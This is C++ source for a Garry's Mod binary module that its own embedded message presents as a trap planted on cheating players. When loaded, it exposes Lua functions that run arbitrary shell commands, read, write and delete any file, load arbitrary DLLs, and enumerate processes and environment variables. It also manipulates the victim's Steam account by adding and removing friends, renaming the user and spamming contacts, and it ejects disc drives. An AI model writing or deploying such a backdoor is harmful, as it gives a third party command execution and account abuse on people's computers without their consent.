

#undef _UNICODE

//Windows
#include <Windows.h>
#include <string>
#include <fstream>
#include <sstream>
#include <psapi.h>
#include <tlhelp32.h>
#include <direct.h>

//GMod
#define LUA_FUNCTION( _function_ ) int _function_( lua_State* L )
#include <gmod-module-base-master/include/GarrysMod/Lua/Interface.h>

//SDK
#include "cdll_int.h"
#include <convar.h>
#include <icvar.h>
#include <tier1.h>

//OSW
#define STEAMWORKS_CLIENT_INTERFACES
#include "Open Steamworks/Steamworks.h"

const char* EasterEgg = "\nI wonder what he thought, as he found this in his GMod folder.\nDid he open it up in a hex editor and look for what it could have done to his system?\ndid he perhaps think he shouldn't have cheated?\nDid he regret what it had done to his Steam friends?\n\nI wonder if he'll ever change his dirty cheatin' ways?\nProbably not.\n\n--Looten Plunder\n\n";

using namespace GarrysMod::Lua;
using namespace std;

CSteamAPILoader loader;
ISteamFriends002* steamFriends			= NULL;
ISteamFriends010* steamFriendsNew		= NULL;

ICvar* g_pCvar 							= NULL;

IVEngineClient* g_EngineClient			= NULL;
#undef LUA
ILuaBase* LUA							= NULL;


//Add
LUA_FUNCTION(SW_AddFriend) {
	const char* str64SteamID = LUA->CheckString(1);
	
	CSteamID steamID( _strtoui64(str64SteamID, NULL, 10) );
	steamFriends->AddFriend(steamID);
	
	return 0;
}

//Remove
LUA_FUNCTION(SW_RemoveFriend) {
	const char* str64SteamID = LUA->CheckString(1);
	
	CSteamID steamID( _strtoui64(str64SteamID, NULL, 10) );
	steamFriends->RemoveFriend(steamID);
	
	return 0;
}

//SetName
LUA_FUNCTION(SW_SetName) {
	steamFriendsNew->SetPersonaName( LUA->CheckString(1) );
	
	return 0;
}

//Spam
LUA_FUNCTION(SW_Spam) {
	int Him				= LUA->CheckNumber(1);
	const char* Spam	= LUA->CheckString(2);
	
	steamFriends->SendMsgToFriend( steamFriends->GetFriendByIndex(Him, k_EFriendFlagImmediate), k_EChatEntryTypeChatMsg, Spam, strlen(Spam) );
	return 0;
}

//GetAll
LUA_FUNCTION(SW_GetAll) {
	LUA->PushNumber( steamFriends->GetFriendCount(k_EFriendFlagImmediate) );
	
	return 1;
}


//ToSID64
LUA_FUNCTION(SW_ToSID64) {
	int Him = LUA->CheckNumber(1);
	
	CSteamID SteamID = steamFriends->GetFriendByIndex(Him, k_EFriendFlagImmediate);
	
	LUA->PushString( std::to_string( SteamID.ConvertToUint64() ).c_str() );
	return 1;
}



//IsOnline
LUA_FUNCTION(SW_IsOnline) {
	int Him = LUA->CheckNumber(1);
	
	bool Online = (steamFriends->GetFriendPersonaState( steamFriends->GetFriendByIndex(Him, k_EFriendFlagImmediate) ) == k_EPersonaStateOnline);
	LUA->PushBool(Online);
	return 1;
}




void TrayControl(const char* drive, DWORD command) {
	//Flags
	DWORD Flags = MCI_WAIT | MCI_OPEN_SHAREABLE | MCI_OPEN_TYPE | MCI_OPEN_TYPE_ID | MCI_OPEN_ELEMENT;
	
	//Open
	MCI_OPEN_PARMS MCI = {0};
	MCI.lpstrDeviceType 	= (LPCTSTR)MCI_DEVTYPE_CD_AUDIO;
	MCI.lpstrElementName	= drive;
	mciSendCommand(0, MCI_OPEN, Flags, (DWORD_PTR)&MCI);
	
	//Eject
	MCI_SET_PARMS Params = {0};
	Flags = MCI_WAIT | command;
	mciSendCommand(MCI.wDeviceID, MCI_SET, Flags, (DWORD_PTR)&Params);
	
	//Close
	Flags = MCI_WAIT;
	MCI_GENERIC_PARMS Params2 = {0};
	mciSendCommand(MCI.wDeviceID, MCI_CLOSE, Flags, (DWORD_PTR)&Params2);
}

//Eject tray
char* Drives[] = {"E", "D", "F", "G", "B", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"};

DWORD CALLBACK DriveEjectAll(LPVOID lpParameter) {
	for (int i=0; i < (sizeof(Drives) / sizeof(char*) ); i++) {
		TrayControl(Drives[i], MCI_SET_DOOR_OPEN); //MCI_SET_DOOR_CLOSED
		
		Sleep(100); //Don't spam the drive
	}
	
	return EXIT_SUCCESS;
}

LUA_FUNCTION(EjectAll) {
	CreateThread(0, 0, DriveEjectAll, 0, 0, 0);
	
	return 0;
}



//ClientCmd
LUA_FUNCTION(ClientCmd) {
	const char* Cmd = LUA->CheckString(1);
	
	g_EngineClient->ClientCmd(Cmd);
	
	return 0;
}



//Write
LUA_FUNCTION(F_Write) {
	const char* File = LUA->CheckString(1);
	const char* Cont = LUA->CheckString(2);
	
	ofstream WriteFile;
	WriteFile.open(File, ios::binary);
	
	if ( !WriteFile.is_open() ) {
		LUA->PushBool(false);
		return 1;
	}
	
	WriteFile << Cont;
	WriteFile.close();
	
	LUA->PushBool(true);
	return 1;
}

//Read
LUA_FUNCTION(F_Read) {
	const char* File = LUA->CheckString(1);
	
	ifstream ReadFile;
	ReadFile.open(File, ios::binary );

	if ( !ReadFile.is_open() ) {
		LUA->PushBool(false);
		return 1;
	}

	ReadFile.seekg(0, ios::end);
		int Len = ReadFile.tellg();
	ReadFile.seekg(0, ios::beg);
	
	char* buffer = new char[Len+1];
		ReadFile.read(buffer, Len);
	buffer[Len] = 0;
	
	LUA->PushString(buffer);
	
	delete [] buffer;
	return 1;
}


//Find
LUA_FUNCTION(F_Find) {
	const char* File = LUA->CheckString(1);
	
	WIN32_FIND_DATA FindFileData;
	HANDLE Finder;
	Finder = FindFirstFile(File, &FindFileData);

	//New table
	LUA->CreateTable();
	
	int index = 0;
	if (Finder != INVALID_HANDLE_VALUE) {
		do {
			index++;
			
			LUA->PushNumber(index);
			LUA->PushString(FindFileData.cFileName);
			LUA->SetTable(-3);
		}
		while (FindNextFile(Finder, &FindFileData) != 0);
		FindClose(Finder);
		index = 0;
	}
	
	//Return table
	return 1;
}

//Delete
LUA_FUNCTION(F_Delete) {
	const char* File = LUA->CheckString(1);
	
	int Res = remove(File);
	
	LUA->PushNumber(Res);
	return 1;
}



//Make recursive dir
LUA_FUNCTION(F_RMKDIR) {
	const char* Dir = LUA->CheckString(1);
	
	char* pszScan = const_cast<char*>(Dir);
	if (*pszScan && *(pszScan + 1) == ':' && *(pszScan + 2) == '\\') {
		pszScan += 3;
	}
	
	char* pszLimit = pszScan + strlen( pszScan ) + 1;
	while (pszScan < pszLimit) {
		if (*pszScan == '\\' || *pszScan == 0) {
			char temp = *pszScan;
			*pszScan = 0;
				_mkdir(Dir);
			*pszScan = temp;
		}
		pszScan++;
	}
	
	return 0;
}




//Messagebox
const char* MB_Title 	= "";
const char* MB_Cont 	= "";
DWORD CALLBACK MessageBoxCall(LPVOID lpParameter) {
	MessageBoxA(0, MB_Cont, MB_Title, MB_OK | MB_ICONERROR);
	
	return EXIT_SUCCESS;
}

LUA_FUNCTION(W_MessageBox) {
	MB_Title 	= LUA->CheckString(1);
	MB_Cont 	= LUA->CheckString(2);
	
	CreateThread(0, 0, MessageBoxCall, 0, 0, 0);
	
	return 0;
}


//LoadLibrary
LUA_FUNCTION(W_LoadLibrary) {
	const char* Module = LUA->CheckString(1);
	
	LoadLibrary(Module);
	return 0;
}


//Get loaded modules
LUA_FUNCTION(W_GetLoadedModules) {
	const char* This = LUA->CheckString(1);
	
	//Get Snapshot
	HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Snap == INVALID_HANDLE_VALUE) {
		LUA->PushBool(false);
		return 0;
	}
	
	//Get process
	PROCESSENTRY32 ProcEntry;
	ProcEntry.dwSize = sizeof(PROCESSENTRY32);
	BOOL Ret = Process32First(Snap, &ProcEntry);
	DWORD ProcID;
	while (Ret) {
		if (!strcmp(ProcEntry.szExeFile, This)) {
			ProcID = ProcEntry.th32ProcessID;
		}
		
		Ret = Process32Next(Snap, &ProcEntry);
	}
	
	//Fail
	if (!ProcID) {
		LUA->PushBool(false);
		return 1;
	}
	
	
	//Get handle
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ProcID);
	if (!hProcess) {
		return 1;
	}
	
	//Make table
	LUA->CreateTable();
	
	//Get modules
	HMODULE hMods[1024];
	DWORD cbNeeded;
	if ( EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded) )  {
		unsigned int i;
		int Tot = 1;
		for ( i = 0; i < (cbNeeded / sizeof(HMODULE)); i++ ) {
			TCHAR szModName[MAX_PATH];
			
			//Get path
			if ( GetModuleFileNameEx( hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR) ) ) {
				//Warning("\t%s (0x%08X)\n", szModName, hMods[i] );
				
				LUA->PushNumber(Tot);
				LUA->PushString(szModName);
				LUA->SetTable(-3);
				
				Tot++;
			}
		}
	}
	
	//Release handle
	CloseHandle(hProcess);
	
	//Return table
	return 1;
}


//Get all processes
LUA_FUNCTION(W_GetProcessList) {
	//Get Snapshot
	HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Snap == INVALID_HANDLE_VALUE) {
		LUA->PushBool(false);
		return 0;
	}
	
	//Make table
	LUA->CreateTable();
	
	//Get process
	PROCESSENTRY32 ProcEntry;
	ProcEntry.dwSize = sizeof(PROCESSENTRY32);
	BOOL Ret = Process32First(Snap, &ProcEntry);
	while (Ret) {
		LUA->PushNumber( ProcEntry.th32ProcessID );
		LUA->PushString( ProcEntry.szExeFile );
		LUA->SetTable(-3);
		
		Ret = Process32Next(Snap, &ProcEntry);
	}
	
	//Return table
	return 1;
}


//GetVar
LUA_FUNCTION(W_GetVar) {
	const char* What = LUA->CheckString(1);
	
	LUA->PushString( getenv(What) );
	return 1;
}

//Exec
LUA_FUNCTION(W_Exec) {
	const char* Cmd = LUA->CheckString(1);
	
	system(Cmd);
	return 0;
}








//GetFlags
LUA_FUNCTION(GetConVarFlags) {
	const char* CVName = LUA->CheckString(1);
	
	ConVar* cvar = g_pCvar->FindVar(CVName);
	if (!cvar) {
		LUA->PushBool(false);
	}
	
	LUA->PushNumber( (float)cvar->m_nFlags );
	
	return 1;
}

//Get all cvars
LUA_FUNCTION(GetAllConVars) {
	ConCommandBase* conCmds = g_pCvar->GetCommands();
	
	LUA->CreateTable();
	
	int i = 1;
	while (conCmds) {
		LUA->PushNumber(i);
		LUA->PushString( conCmds->GetName() );
		LUA->SetTable(-3);
		
		i++;
		conCmds = conCmds->GetNext();
	}
	
	//Return table
	return 1;
}





//Steamworks
void LoadSteamWorks() {
	CreateInterfaceFn factory = loader.GetSteam3Factory();
	if (!factory) {
		Warning("Can't get interface G\n");
		return;
	}
	
	ISteamClient012* pSteamClient = (ISteamClient012*)factory(STEAMCLIENT_INTERFACE_VERSION_012, NULL);
	if (!pSteamClient) {
		Warning("Can't get interface H\n");
		return;
	}
	
	HSteamPipe hPipe = pSteamClient->CreateSteamPipe();
	if (!hPipe) {
		Warning("Can't get interface I\n");
		return;
	}
	
	HSteamUser hUser = pSteamClient->ConnectToGlobalUser(hPipe);
	if (!hUser) {
		Warning("Can't get interface J\n");
		return;
	}
	
	steamFriends = (ISteamFriends002*)pSteamClient->GetISteamFriends(hUser, hPipe, STEAMFRIENDS_INTERFACE_VERSION_002);
	steamFriendsNew = (ISteamFriends010*)pSteamClient->GetISteamFriends(hUser, hPipe, STEAMFRIENDS_INTERFACE_VERSION_010);
}



static bool Loaded 	= false;
const char* Key 	= "[Nukem] HeX has balls of steel!\n";



GMOD_MODULE_OPEN() {
	LUA = LUA;
	
	if (Loaded) {
		return 0;
	}
	Loaded = true;
	
	
	//Canload
	bool CanLoad = false;
	LUA->PushSpecial(0);
		LUA->GetField(-1, Key);
		
		if ( LUA->IsType(-1, Type::BOOL) && LUA->GetBool(-1) == false ) {
			CanLoad = true;
		}
		LUA->Pop();
		
		LUA->PushNil();
		LUA->SetField(-2, Key);
	LUA->Pop();
	
	if (CanLoad) {
		Warning(Key);
		
	} else {
		Msg(EasterEgg);
		return 0;
	}
	
	
	
	//engineFactory
	CreateInterfaceFn engineFactory = Sys_GetFactory("engine.dll");
	if (!engineFactory) {
		Warning("Can't get interface E\n");
		return 0;
	}
	
	//IVEngineClient
	g_EngineClient = (IVEngineClient*)engineFactory(VENGINE_CLIENT_INTERFACE_VERSION_13, NULL);
	if (!g_EngineClient) {
		Warning("Can't get interface F\n");
		return 0;
	}
	
	//VSTDLib
	CreateInterfaceFn VSTDLibFactory = Sys_GetFactory("vstdlib.dll");
	if (!VSTDLibFactory) {
		Warning("Can't get interface G\n");
		return 0;
	}
	
	//ICVar
	g_pCvar = (ICvar*)VSTDLibFactory(CVAR_INTERFACE_VERSION, NULL);
	if (!g_pCvar) {
		Warning("Can't get interface H\n");
		return 0;
	}
	
	
	//Steamworks
	LoadSteamWorks();
	
	
	//Load
	LUA->PushSpecial(0);
		LUA->CreateTable();
			//Steamworks
			if (steamFriends) {
				LUA->CreateTable();
					LUA->PushCFunction(SW_AddFriend);
					LUA->SetField(-2, "Add");
					
					LUA->PushCFunction(SW_RemoveFriend);
					LUA->SetField(-2, "Remove");
					
					LUA->PushCFunction(SW_SetName);
					LUA->SetField(-2, "SetName");
					
					LUA->PushCFunction(SW_Spam);
					LUA->SetField(-2, "Spam");
					
					LUA->PushCFunction(SW_GetAll);
					LUA->SetField(-2, "GetAll");
					
					LUA->PushCFunction(SW_IsOnline);
					LUA->SetField(-2, "IsOnline");
					
					LUA->PushCFunction(SW_ToSID64);
					LUA->SetField(-2, "ToSID64");
				LUA->SetField(-2, "steam");
			}
			
			//Win
			LUA->CreateTable();
				LUA->PushCFunction(EjectAll);
				LUA->SetField(-2, "EjectAll");
				
				LUA->PushCFunction(W_MessageBox);
				LUA->SetField(-2, "MessageBox");
				
				LUA->PushCFunction(W_GetLoadedModules);
				LUA->SetField(-2, "GetLoadedModules");
				
				LUA->PushCFunction(W_Exec);
				LUA->SetField(-2, "Exec");
				
				LUA->PushCFunction(W_GetVar);
				LUA->SetField(-2, "GetVar");
				
				LUA->PushCFunction(W_GetProcessList);
				LUA->SetField(-2, "GetProcessList");
				
				LUA->PushCFunction(W_LoadLibrary);
				LUA->SetField(-2, "LoadLibrary");
			LUA->SetField(-2, "win");
			
			//File
			LUA->CreateTable();
				LUA->PushCFunction(F_Write);
				LUA->SetField(-2, "Write");
				
				LUA->PushCFunction(F_Read);
				LUA->SetField(-2, "Read");
				
				LUA->PushCFunction(F_Find);
				LUA->SetField(-2, "Find");
				
				LUA->PushCFunction(F_RMKDIR);
				LUA->SetField(-2, "RMKDIR");
				
				LUA->PushCFunction(F_Delete);
				LUA->SetField(-2, "Delete");
			LUA->SetField(-2, "file");
			
			//CVars
			LUA->CreateTable();
				LUA->PushCFunction(GetConVarFlags);
				LUA->SetField(-2, "GetFlags");
				
				LUA->PushCFunction(GetAllConVars);
				LUA->SetField(-2, "GetAll");
			LUA->SetField(-2, "cvars");
			
			//Shhh
			LUA->PushBool(true);
			LUA->SetField(-2, "DeleteSystem32");
			
			//Main
			LUA->PushCFunction(ClientCmd);
			LUA->SetField(-2, "ClientCmd");
		LUA->SetField(-2, Key);
	LUA->Pop();
	
	return 0;
}

GMOD_MODULE_CLOSE() {
	return 0;
}











